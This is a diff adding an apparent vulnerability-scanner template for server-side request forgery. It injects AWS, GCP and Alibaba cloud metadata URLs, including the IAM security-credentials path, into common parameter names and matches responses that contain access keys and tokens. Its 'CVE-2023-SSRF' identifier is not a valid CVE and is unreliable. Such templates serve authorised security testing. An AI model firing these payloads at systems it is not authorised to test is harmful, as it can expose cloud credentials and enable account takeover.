@@ -1,0 +1,52 @@
+id: cve-2023-ssrf-common
+info:
+  name: Common SSRF Attack Patterns
+  author: hybridrecon-x
+  severity: high
+  description: Detects common SSRF vulnerabilities via cloud metadata endpoints
+  tags: cve,ssrf,cloud
+  classification:
+    cve-id: CVE-2023-SSRF
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/{{path}}?uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/{{path}}?target=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/{{path}}?dest=http://100.100.100.200/latest/meta-data/"
+
+    payloads:
+      path:
+        - proxy
+        - fetch
+        - url
+        - redirect
+        - link
+        - forward
+        - callback
+        - api
+        - request
+        - load
+        - image
+        - img
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-credentials"
+          - "iam/security"
+          - "computeMetadata"
+
+      - type: word
+        part: body
+        words:
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "Token"
+        condition: and
